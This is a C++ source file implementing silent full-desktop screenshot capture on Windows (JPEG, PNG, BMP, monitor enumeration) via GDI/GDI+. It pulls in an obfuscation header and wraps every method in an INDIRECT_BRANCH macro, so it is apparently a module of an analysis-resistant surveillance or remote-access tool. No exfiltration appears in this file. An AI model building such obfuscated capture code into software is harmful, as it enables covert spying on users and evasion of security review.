#include <diarna/compiler_port.hpp>
#include <diarna/capture/capture.hpp>

#include <gdiplus.h>
#include <mutex>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("gdiplus.lib")
DIARNA_LINK_LIB("ole32.lib")

namespace diarna::capture {

std::atomic<int> Screenshot::gdiplus_ref_count_{0};
std::mutex Screenshot::gdiplus_mutex_;

DIARNA_INLINE static void init_gdiplus_token(ULONG_PTR& token) {
    Gdiplus::GdiplusStartupInput si;
    si.GdiplusVersion = 1;
    si.DebugEventCallback = nullptr;
    si.SuppressBackgroundThread = FALSE;
    si.SuppressExternalCodecs = FALSE;
    Gdiplus::GdiplusStartup(&token, &si, nullptr);
}

Screenshot::Screenshot() {
    INDIRECT_BRANCH;
    ensure_gdiplus();
}

Screenshot::~Screenshot() {
    INDIRECT_BRANCH;
    release_gdiplus();
}

DIARNA_INLINE void Screenshot::ensure_gdiplus() {
    std::lock_guard<std::mutex> lock(gdiplus_mutex_);
    if (gdiplus_ref_count_.fetch_add(1) == 0) {
        init_gdiplus_token(gdiplus_token_);
    }
}

DIARNA_INLINE void Screenshot::release_gdiplus() {
    std::lock_guard<std::mutex> lock(gdiplus_mutex_);
    if (gdiplus_ref_count_.fetch_sub(1) == 1) {
        Gdiplus::GdiplusShutdown(gdiplus_token_);
        gdiplus_token_ = 0;
    }
}

int Screenshot::get_encoder_clsid(const wchar_t* mime_type, CLSID* clsid) const {
    INDIRECT_BRANCH;
    *clsid = CLSID{};
    UINT num_encoders = 0;
    UINT size_bytes = 0;
    Gdiplus::GetImageEncodersSize(&num_encoders, &size_bytes);
    if (size_bytes == 0 || num_encoders == 0)
        return -1;

    std::vector<uint8_t> buffer(size_bytes);
    auto* codecs = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buffer.data());
    Gdiplus::Status st = Gdiplus::GetImageEncoders(num_encoders, size_bytes, codecs);
    if (st != Gdiplus::Ok)
        return -2;

    for (UINT i = 0; i < num_encoders; ++i) {
        if (wcscmp(codecs[i].MimeType, mime_type) == 0) {
            *clsid = codecs[i].Clsid;
            return 0;
        }
    }
    return -3;
}

std::vector<uint8_t> Screenshot::capture_encoded(const CLSID& encoder_clsid) {
    INDIRECT_BRANCH;

    int screen_w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screen_h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int origin_x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int origin_y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    if (screen_w <= 0 || screen_h <= 0)
        return {};

    HDC screen_dc = GetDC(nullptr);
    if (!screen_dc)
        return {};

    HDC mem_dc = CreateCompatibleDC(screen_dc);
    if (!mem_dc) {
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HBITMAP hbmp = CreateCompatibleBitmap(screen_dc, screen_w, screen_h);
    if (!hbmp) {
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HGDIOBJ old_bmp = SelectObject(mem_dc, hbmp);
    BitBlt(mem_dc, 0, 0, screen_w, screen_h, screen_dc, origin_x, origin_y, SRCCOPY);

    Gdiplus::Bitmap bitmap(hbmp, nullptr);
    if (bitmap.GetLastStatus() != Gdiplus::Ok) {
        SelectObject(mem_dc, old_bmp);
        DeleteObject(hbmp);
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HGLOBAL hglobal = GlobalAlloc(GMEM_MOVEABLE, 0);
    if (!hglobal) {
        SelectObject(mem_dc, old_bmp);
        DeleteObject(hbmp);
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    IStream* stream = nullptr;
    HRESULT hr = CreateStreamOnHGlobal(hglobal, TRUE, &stream);
    if (FAILED(hr) || !stream) {
        GlobalFree(hglobal);
        SelectObject(mem_dc, old_bmp);
        DeleteObject(hbmp);
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    Gdiplus::Status save_st;
    if (encoder_clsid.Data1 != 0) {
        save_st = bitmap.Save(stream, &encoder_clsid, nullptr);
    } else {
        save_st = bitmap.Save(stream, &encoder_clsid, nullptr);
    }

    std::vector<uint8_t> result;
    if (save_st == Gdiplus::Ok) {
        LARGE_INTEGER li;
        li.QuadPart = 0;
        ULARGE_INTEGER uli;
        stream->Seek(li, STREAM_SEEK_END, &uli);
        result.resize(static_cast<size_t>(uli.QuadPart));
        stream->Seek(li, STREAM_SEEK_SET, nullptr);
        ULONG bytes_read = 0;
        stream->Read(result.data(), static_cast<ULONG>(result.size()), &bytes_read);
    }

    stream->Release();

    SelectObject(mem_dc, old_bmp);
    DeleteObject(hbmp);
    DeleteDC(mem_dc);
    ReleaseDC(nullptr, screen_dc);

    return result;
}

std::vector<uint8_t> Screenshot::capture_jpeg(int quality) {
    INDIRECT_BRANCH;
    CLSID jpeg_clsid;
    if (get_encoder_clsid(L"image/jpeg", &jpeg_clsid) != 0)
        return {};

    int screen_w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screen_h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int origin_x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int origin_y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    if (screen_w <= 0 || screen_h <= 0)
        return {};

    HDC screen_dc = GetDC(nullptr);
    if (!screen_dc)
        return {};

    HDC mem_dc = CreateCompatibleDC(screen_dc);
    if (!mem_dc) {
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HBITMAP hbmp = CreateCompatibleBitmap(screen_dc, screen_w, screen_h);
    if (!hbmp) {
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HGDIOBJ old_bmp = SelectObject(mem_dc, hbmp);
    BitBlt(mem_dc, 0, 0, screen_w, screen_h, screen_dc, origin_x, origin_y, SRCCOPY);

    Gdiplus::Bitmap bitmap(hbmp, nullptr);
    if (bitmap.GetLastStatus() != Gdiplus::Ok) {
        SelectObject(mem_dc, old_bmp);
        DeleteObject(hbmp);
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HGLOBAL hglobal = GlobalAlloc(GMEM_MOVEABLE, 0);
    if (!hglobal) {
        SelectObject(mem_dc, old_bmp);
        DeleteObject(hbmp);
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    IStream* stream = nullptr;
    HRESULT hr = CreateStreamOnHGlobal(hglobal, TRUE, &stream);
    if (FAILED(hr) || !stream) {
        GlobalFree(hglobal);
        SelectObject(mem_dc, old_bmp);
        DeleteObject(hbmp);
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    Gdiplus::EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid = Gdiplus::EncoderQuality;
    params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    long q = static_cast<long>(quality);
    if (q < 0) q = 0;
    if (q > 100) q = 100;
    params.Parameter[0].Value = &q;

    Gdiplus::Status save_st = bitmap.Save(stream, &jpeg_clsid, &params);

    std::vector<uint8_t> result;
    if (save_st == Gdiplus::Ok) {
        LARGE_INTEGER li;
        li.QuadPart = 0;
        ULARGE_INTEGER uli;
        stream->Seek(li, STREAM_SEEK_END, &uli);
        result.resize(static_cast<size_t>(uli.QuadPart));
        stream->Seek(li, STREAM_SEEK_SET, nullptr);
        ULONG bytes_read = 0;
        stream->Read(result.data(), static_cast<ULONG>(result.size()), &bytes_read);
    }

    stream->Release();
    SelectObject(mem_dc, old_bmp);
    DeleteObject(hbmp);
    DeleteDC(mem_dc);
    ReleaseDC(nullptr, screen_dc);

    return result;
}

std::vector<uint8_t> Screenshot::capture_png() {
    INDIRECT_BRANCH;
    CLSID png_clsid;
    if (get_encoder_clsid(L"image/png", &png_clsid) != 0)
        return {};
    return capture_encoded(png_clsid);
}

std::vector<uint8_t> Screenshot::capture_bmp() {
    INDIRECT_BRANCH;

    int screen_w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screen_h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int origin_x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int origin_y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    if (screen_w <= 0 || screen_h <= 0)
        return {};

    HDC screen_dc = GetDC(nullptr);
    if (!screen_dc)
        return {};

    HDC mem_dc = CreateCompatibleDC(screen_dc);
    if (!mem_dc) {
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HBITMAP hbmp = CreateCompatibleBitmap(screen_dc, screen_w, screen_h);
    if (!hbmp) {
        DeleteDC(mem_dc);
        ReleaseDC(nullptr, screen_dc);
        return {};
    }

    HGDIOBJ old_bmp = SelectObject(mem_dc, hbmp);
    BitBlt(mem_dc, 0, 0, screen_w, screen_h, screen_dc, origin_x, origin_y, SRCCOPY);

    BITMAPINFOHEADER bih = {};
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = screen_w;
    bih.biHeight = screen_h;
    bih.biPlanes = 1;
    bih.biBitCount = 32;
    bih.biCompression = BI_RGB;

    int row_padded = ((screen_w * 32 + 31) / 32) * 4;
    DWORD pixel_data_size = static_cast<DWORD>(row_padded * screen_h);
    DWORD dib_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pixel_data_size;

    std::vector<uint8_t> result(dib_size, 0);

    auto* bf = reinterpret_cast<BITMAPFILEHEADER*>(result.data());
    bf->bfType = 0x4D42;
    bf->bfSize = dib_size;
    bf->bfReserved1 = 0;
    bf->bfReserved2 = 0;
    bf->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    auto* bi = reinterpret_cast<BITMAPINFOHEADER*>(result.data() + sizeof(BITMAPFILEHEADER));
    *bi = bih;

    uint8_t* pixel_data = result.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    int dib_lines = GetDIBits(screen_dc, hbmp, 0, screen_h,
                               pixel_data,
                               reinterpret_cast<BITMAPINFO*>(bi),
                               DIB_RGB_COLORS);

    if (dib_lines == 0) {
        result.clear();
    } else {
        for (int y = 0; y < screen_h; ++y) {
            uint8_t* row = pixel_data + static_cast<size_t>(y) * row_padded;
            for (int x = 0; x < screen_w; ++x) {
                row[x * 4 + 3] = 255;
            }
        }
    }

    SelectObject(mem_dc, old_bmp);
    DeleteObject(hbmp);
    DeleteDC(mem_dc);
    ReleaseDC(nullptr, screen_dc);

    return result;
}

namespace {
BOOL CALLBACK monitor_enum_proc(HMONITOR hmon, HDC /*hdc*/, LPRECT lprc, LPARAM lp) {
    INDIRECT_BRANCH;
    auto* data = reinterpret_cast<std::vector<MonitorInfo>*>(lp);
    if (!data)
        return FALSE;

    MONITORINFOEXW mi;
    mi.cbSize = sizeof(mi);

    if (!GetMonitorInfoW(hmon, &mi))
        return TRUE;

    MonitorInfo info;
    info.index = static_cast<int>(data->size());
    info.rect = mi.rcMonitor;
    info.is_primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
    info.device_name = mi.szDevice;

    data->push_back(std::move(info));
    return TRUE;
}
} // anonymous namespace

std::vector<MonitorInfo> Screenshot::enumerate_monitors() {
    INDIRECT_BRANCH;
    std::vector<MonitorInfo> monitors;
    HDC screen_dc = GetDC(nullptr);
    EnumDisplayMonitors(screen_dc, nullptr, monitor_enum_proc,
                         reinterpret_cast<LPARAM>(&monitors));
    if (screen_dc)
        ReleaseDC(nullptr, screen_dc);
    return monitors;
}

} // namespace diarna::capture
